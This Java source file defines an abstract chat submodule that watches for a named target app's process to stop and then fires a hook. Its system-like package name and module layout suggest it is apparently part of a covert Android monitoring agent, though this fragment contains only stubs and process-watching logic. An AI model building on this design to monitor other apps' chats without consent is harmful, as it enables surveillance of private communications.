package com.android.networking.module.chat;

import java.io.IOException;

import com.android.networking.ProcessInfo;
import com.android.networking.ProcessStatus;
import com.android.networking.auto.Cfg;
import com.android.networking.module.ModuleChat;
import com.android.networking.module.SubModule;
import com.android.networking.util.Check;

public abstract class SubModuleChat extends SubModule {

	private static final String TAG = "SubModuleChat";
	@Override
	protected void go() {
		// TODO Auto-generated method stub

	}

	@Override
	protected void start() {
		// TODO Auto-generated method stub

	}

	@Override
	protected void stop() {
		// TODO Auto-generated method stub

	}
	
	@Override
	public int notification(ProcessInfo process) {

		if (process.processInfo.processName.contains(getObservingProgram())) {
			if (process.status == ProcessStatus.STOP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
				}
				notifyStopProgram(process.processInfo.processName);
				return 1;
			}
		}
		return 0;
	}
	
	protected ModuleChat getModule(){
		return (ModuleChat) module;
	}

	abstract void notifyStopProgram(String processName);

	abstract int getProgramId();
	abstract String getObservingProgram();
}
